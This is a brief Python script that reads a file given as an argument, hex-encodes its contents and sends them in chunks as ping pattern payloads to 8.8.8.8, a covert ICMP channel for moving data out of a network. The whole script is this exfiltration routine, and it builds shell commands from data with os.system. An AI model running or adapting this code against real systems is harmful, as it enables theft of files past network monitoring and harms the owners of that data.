import subprocess, sys, os

def send_icmp_packet(data):
    # Craft and send an ICMP packet using a system command
    command = "ping -p {} 8.8.8.8".format(data)
    os.system(command)
    #subprocess.call(command, shell=True)

def encode_file(filename):
    # Read the file as binary data
    with open(filename, "rb") as file:
        file_data = file.read()

    # Convert binary data to hexadecimal representation
    hex_data = file_data.hex()

    # Break the hexadecimal data into chunks (adjust the chunk size as needed)
    chunk_size = 32 # size in characteres
    chunks = [hex_data[i:i + chunk_size] for i in range(0, len(hex_data), chunk_size)]

    # Send each chunk as an ICMP packet
    for chunk in chunks:
        send_icmp_packet(chunk) #sys.argv[2])

# Usage: encode_file("filename")
encode_file(sys.argv[1])
